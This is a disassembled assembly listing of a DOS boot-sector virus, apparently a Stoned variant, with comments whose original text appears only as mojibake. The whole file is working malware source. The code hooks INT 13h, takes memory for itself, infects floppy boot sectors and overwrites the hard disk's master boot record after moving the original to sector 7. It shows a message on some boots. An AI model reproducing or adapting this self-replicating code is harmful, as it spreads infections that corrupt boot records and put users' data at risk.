		jmp	far ptr loc_2		;*(07C0:0005)
		jmp	loc_8			; (00A1)
data_27 	db	0
data_28 	dd	0F000EC59h
data_29 	dd	9F8000E4h
data_30 	dd	07C00h

;-----------------------------------------------------------------------------
;		 ‚µ®¤­  ²®·ª  ­  INT 13h
;-----------------------------------------------------------------------------

		push	ds
		push	ax
		cmp	ah,2			; €ª® ´³­ª¶¨¿²  ¥ ¯®-¬ «ª  ®²
		jb	loc_3			; 2 ¨«¨ ¯®-£®«¿¬  ¨«¨ ° ¢­ 
		cmp	ah,4			; ­  4 ¨§¯º«­¿¢  ­ ¯°° ¢® INT 13h
		jae	loc_3
		or	dl,dl			; “±²°®¨±²¢®²® ¥ A ?
		jnz	loc_3
		xor	ax,ax			; Zero register
		mov	ds,ax
		mov	al,byte ptr ds:[43Fh]	; °®¢¥°¿¢  ¤ «¨ ¬®²®°  ­ 
		test	al,1			; A ¥ ¢ª«¾·¥­
		jnz	loc_3			; Jump if not zero
		call	sub_1			; Ž¯¨² ¤  § ° §¿¢ 
loc_3:
		pop	ax
		pop	ds
		jmp	cs:data_28		; (6B8E:0009=0EC59h)

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_1		proc	near
		push	bx
		push	cx
		push	dx			; ‡ ¯ §¢  °¥£¨±²°¨²¥
		push	es
		push	si
		push	di
		mov	si,4
loc_4:
		mov	ax,201h
		push	cs
		pop	es
		mov	bx,200h
		xor	cx,cx			; Zero register
		mov	dx,cx
		inc	cx
		pushf
		call	cs:data_28		; —¥²¥ BOOT ±¥ª²®° 
		jnc	loc_5			; Jump if carry=0
		xor	ax,ax			; °¨ £°¥¸ª  °¥ª «¨¡°¨° 
		pushf				; ³±²°®¨±²¢®²®
		call	cs:data_28		; (6B8E:0009=0EC59h)
		dec	si
		jnz	loc_4			; ° ¢¨ 4 ®¯¨² 
		jmp	short loc_7		; ˆ§µ®¤
		nop
loc_5:
		xor	si,si			; Zero register
		mov	di,200h
		cld				; Clear direction
		push	cs
		pop	ds
		lodsw				; °®¢¥°¿¢  ¤ «¨ ¥ § ° §¥­
		cmp	ax,[di] 		; ¯°®·¥²¥­¨¿ ¤¨±ª
		jne	loc_6
		lodsw
		cmp	ax,[di+2]
		je	loc_7			; €ª® ¥ ¨§«¨§ 
loc_6:
		mov	ax,301h
		mov	bx,200h 		; °¥¬¥±²¢  BOOT
		mov	cl,3
		mov	dh,1
		pushf
		call	cs:data_28
		jc	loc_7			; Jump if carry Set
		mov	ax,301h
		xor	bx,bx			; ‡ ¯¨±¢  ¢¨°³± 
		mov	cl,1
		xor	dx,dx
		pushf
		call	cs:data_28
loc_7:
		pop	di
		pop	si
		pop	es			; ‚º§±² ­®¢¿¢  °¥£¨±²°¨²¥
		pop	dx
		pop	cx
		pop	bx
		retn
sub_1		endp

loc_8:
		xor	ax,ax			; Zero register
		mov	ds,ax
		cli				; Disable interrupts
		mov	ss,ax
		mov	sp,7C00h
		sti				;
		mov	ax,word ptr ds:[4Ch]	; ®±² ¢¿ ¢ AX ¢¥ª²®°  ­  INT 13H
		mov	word ptr ds:[7C09h],ax	; ‡ ¯ §¢  £® ­  ®²¬¥±²¢ ­¥ 9h
		mov	ax,word ptr ds:[4Eh]	; ‚§¥¬  ±¥£¬¥­²  ­  INT 13H
		mov	word ptr ds:[7C0Bh],ax	; ‡ ¯ §¢  £® ­  ®²¬¥±²¢ ­¥ Bh
		mov	ax,word ptr ds:[413h]	;  ¬ «¿¢  ­ «¨·­ ²  ¯ ¬¥² ± 1K
		dec	ax
		dec	ax
		mov	word ptr ds:[413h],ax
		mov	cl,6
		shl	ax,cl
		mov	es,ax			; ‡ °¥¦¤  ¢ ES ­ ©-¢¨±®ª¨¿  ¤°¥±
		mov	word ptr ds:[7C0Fh],ax	; ­  ª®©²® ±¥ ¯°¥¬¥±²¢ 
		mov	ax,15h
		mov	word ptr ds:[4Ch],ax	; INT 13H ‘Ž—ˆ Ž’Œ…‘’‚€… 15H Ž’
		mov	word ptr ds:[4Eh],es	; Ž—€‹Ž’Ž Œ“
		mov	cx,1B8h
		push	cs			;CS = 7C0h = DS
		pop	ds
		xor	si,si
		mov	di,si
		cld
		rep	movsb			; °¥±²¢  1B8h ¡ ©² 
		jmp	cs:data_29		; °¥µ®¤ ­  ±«¥¤¢ ¹ ²  ¨­±²°³ª¶¨¿
		mov	ax,0
		int	13h			; ¥ª «¨¡°¨°  ¤¨±ª 

		xor	ax,ax			; Zero register
		mov	es,ax			; ES = AX = 00h
		mov	ax,201h 		; “±² ­®¢¿¢  ¯ ° ¬¥²°¨ § 
		mov	bx,7C00h		; § °¥¦¤ ­¥ ­  BOOT
		cmp	cs:data_27,0		; °®¢¥°¿¢  ´« £ §  ³±²°®¨±²¢®
		je	loc_9			; °¥µ®¤ ¯°¨ Flopy disk
		mov	cx,7
		mov	dx,80h
		int	13h			; ‡ °¥¦¤  BOOT

		jmp	short loc_12		; (014E)
		nop
loc_9:
		mov	cx,3
		mov	dx,100h
		int	13h			; ‡ °¥¦¤  BOOT

		jc	loc_12			; Jump if carry Set
		test	byte ptr es:[46Ch],7	; °®¢¥°¿¢  ¤ «¨ ¤  ¤ ¤¥
		jnz	loc_11			; ±º®¡¹¥­¨¥
		mov	si,189h 		;
		push	cs
		pop	ds
loc_10:
		lodsb				; ’º°±¨ ª° ¿² ­  ±²°¨­£ 
		or	al,al
		jz	loc_11			; €ª® ­¥ ¥ ª° ¿ ¨§¢¥¦¤  ±¨¬¢®«
		mov	ah,0Eh
		mov	bh,0
		int	10h			; Video display   ah=functn 0Eh
						;  write char al, teletype mode
		jmp	short loc_10		; (011D)
loc_11:
		push	cs
		pop	es
		mov	ax,201h 		; Ž¯¨²¢  ±¥ ¤  ·¥²¥ ®² ²¢º°¤ ¤¨±ª
		mov	bx,200h 		; ª ²® ¯®¬¥±²¢  ¯°®·¥²¥­®²® ®²
		mov	cl,1			; ®²¬¥±²¢ ­¥ 200h
		mov	dx,80h
		int	13h			; Disk	dl=drive #: ah=func a2h
						;  read sectors to memory es:bx
		jc	loc_12			; €ª® £°¥¸ª  ? -> ˆ§µ®¤
		push	cs
		pop	ds
		mov	si,200h
		mov	di,0
		lodsw				; °®¢¥°¿¢  ¤ «¨ ±º¢¯ ¤  ± ­ · «®²®
		cmp	ax,[di] 		; ­  ¢¨°³± 
		jne	loc_13			; €ª® ­¥ ¯°¥µ®¤ §  § ° §¿¢ ­¥
		lodsw
		cmp	ax,[di+2]
		jne	loc_13
loc_12:
		mov	cs:data_27,0		; (6B8E:0008=0)
		jmp	cs:data_30		; ˆ§¯º«­¿¢  BOOT
loc_13:
		mov	cs:data_27,2		; ®±² ¢¿ ³ª § ²¥« ²¢º°¤ ¤¨±ª
		mov	ax,301h
		mov	bx,200h 		; °¥¬¥±²¢  BOOT ¢ ±¥ª²®° 7
		mov	cx,7			; ±²° ­  0
		mov	dx,80h
		int	13h

		jc	loc_12			; °¨ £°¥¸ª  ¨§¯º«­¿¢  BOOT
		push	cs
		pop	ds
		push	cs
		pop	es
		mov	si,3BEh 		 ; Œ¥±²¨ partition table
		mov	di,1BEh
		mov	cx,242h
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]

		mov	ax,301h
		xor	bx,bx			; ‡ ¯¨±¢  ± ¬¨¿² ¢¨°³±
		inc	cl
		int	13h			; Disk	dl=drive #: ah=func a3h
						;  write sectors from mem es:bx
		jmp	short loc_12		; Ž²¨¢  ¤  ¨§¯¨«­¿¢  BOOT

;------------------------------------------------------------------------------------------
;			Ž² ²³ª ­ ² ²ª ±  ²¥ª±²®¢¥
;------------------------------------------------------------------------------------------

		pop	es
		pop	cx
		db	6Fh
		jnz	$+74h			; Jump if not zero
		and	[bx+si+43h],dl
		and	[bx+di+73h],ch
		and	[bp+6Fh],ch
		ja	$+22h			; Jump if above
		push	bx
		jz	$+71h			; Jump if zero
		db	6Eh
		db	65h
		db	64h
		and	[bx],ax
		or	ax,0A0Ah
		add	[si+45h],cl
		inc	di
		inc	cx
		dec	sp
		dec	cx
		push	bx
		inc	bp
		xor	al,[bx+di]
		add	al,32h			; '2'
		add	word ptr ds:[0B00h][bx+si],ax	; (6B7E:0B00=0)
		add	ax,132h
		db	72 dup (0)
